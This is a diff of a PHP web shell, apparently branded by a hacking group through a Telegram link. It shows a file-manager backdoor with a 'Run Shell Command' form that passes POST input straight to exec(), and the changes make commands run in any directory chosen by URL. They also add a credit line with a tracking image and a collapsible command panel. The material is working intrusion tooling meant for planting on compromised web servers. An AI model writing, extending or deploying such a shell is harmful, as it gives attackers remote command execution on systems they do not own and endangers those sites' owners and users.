@@ -236,6 +236,7 @@
                   </tr>";
         }
         echo "</tbody></table></div></div>";
+        echo '<p>Create By <a href="https://t.me/RibelCyberTeam" target="_blank">Ribel</a><img src="https://bot.backlinkku.id/verified.gif" width="17" height="17">.</p>';
         // Menghandle view file
         if (isset($_GET['view'])) {
             $file = unhex($_GET['view']);
@@ -401,11 +402,14 @@
                 echo "<script>alert('Folder tidak ditemukan.'); window.location='?path=" . hex(dirname($folder)) . "';</script>";
             }
         }
+        // CMD sesuai dengan direktori di URL
         if (isset($_POST['cmd'])) {
             $command = $_POST['cmd'];  
+            $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
             echo "<div class='mt-4'>";
             $output = [];
             $resultCode = null;
+            chdir($path);
             exec($command, $output, $resultCode);
             if (empty($output)) {
                 ob_start();
@@ -446,7 +450,6 @@
             }
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>$output</pre>";
-        
             echo "</div>";
         }
         // Create a new file
@@ -470,6 +473,14 @@
             }
         }
                 ?>
+    <div class='container-fluid'>
+			<div class='corner anu py-3'>
+				<button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
+				<i class='bi bi-info-circle'></i> [CMD] - [Create File] - [Create Folder] <i class='bi bi-chevron-down'></i>
+				</button>
+			</div>
+			<div class='collapse text-dark mb-3' id='collapseExample'>
+				<div class='box shadow bg-light p-3 rounded-3'>
                 <div class="mt-4">
             <h3>Run Shell Command</h3>
             <form method="POST">
@@ -494,7 +505,6 @@
             </form>
         </div>
     </div>
-
     <!-- Script Bootstrap dan FontAwesome -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
